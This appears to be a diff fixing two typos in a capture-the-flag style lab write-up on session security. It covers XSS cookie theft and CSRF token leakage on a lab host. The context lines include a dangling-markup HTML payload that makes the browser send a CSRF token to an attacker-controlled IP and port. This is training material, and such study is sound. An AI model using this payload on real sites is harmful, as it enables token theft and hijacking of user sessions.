@@ -270,7 +270,7 @@ Here you have successfully extracted the sessions!
 
 ### XSS
 
-For an XSS attack to result in session cookie leakge, the following requirements must be fulfilled:
+For an XSS attack to result in session cookie leakage, the following requirements must be fulfilled:
 
 - Session cookies should be carried in all HTTP requests
 - Session cookies should be accessible by JS code
@@ -549,7 +549,7 @@ Now you can get the CSRF token via sending the below payload:
 <table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
 ```
 
-While still loggen in as Julie Rogers, open a new tab and visit the ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f```. You will notice a connection being made that leaks the CSRF token.
+While still logged in as Julie Rogers, open a new tab and visit the ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f```. You will notice a connection being made that leaks the CSRF token.
 
 ![csrf 9](../../../images/session_security_csrf9.png)
 
